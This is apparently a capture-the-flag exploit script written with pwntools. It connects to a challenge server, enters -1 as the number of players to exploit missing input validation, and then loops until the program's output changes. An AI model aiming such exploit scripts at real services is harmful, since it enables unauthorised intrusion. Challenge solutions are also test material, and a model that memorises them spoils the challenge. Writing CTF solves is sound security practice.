from pwn import *

context.binary = exe = ELF('./chall')

#io = process()
#gdb.attach(io, api=True)
#context.log_level = 'debug'

io = remote('0.cloud.chals.io', 11114)

io.recvuntil(b'players:\n')
io.sendline(b'-1')
i = 0
res = io.recvuntil(b' ')
#for _ in range(2000):
while(b'Average' not in res):
    io.sendlineafter(b':\n', b'y')
    io.sendlineafter(b':\n', b'y')
    i += 1
    res = io.recvuntil(b' ')
    log.info(f'Number of Players: {i}')

io.interactive()